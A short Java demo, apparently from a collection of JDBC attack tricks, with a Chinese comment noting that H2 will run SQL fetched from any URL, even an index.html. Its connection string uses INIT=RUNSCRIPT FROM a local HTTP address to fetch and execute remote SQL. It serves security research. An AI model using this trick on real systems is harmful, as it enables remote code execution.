package com.jdbc.tricks;

import java.sql.Connection;
import java.sql.DriverManager;

// 灵感来自于https://mp.weixin.qq.com/s/vdb2zUbE4DxV-ua1xWm5cw，一个有趣的特性是，当我们远程发起h2 jdbc连接时，连接的文件其实不一定需要是一个xxx.sql，因为h2引擎只是获取了一个url的返回进行连接，那么我们完全可以把sql语句写在index.html，直接连接该ip
public class NoSqlSuffix {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:50025/'";
        Connection conn = DriverManager.getConnection(url);
    }
}
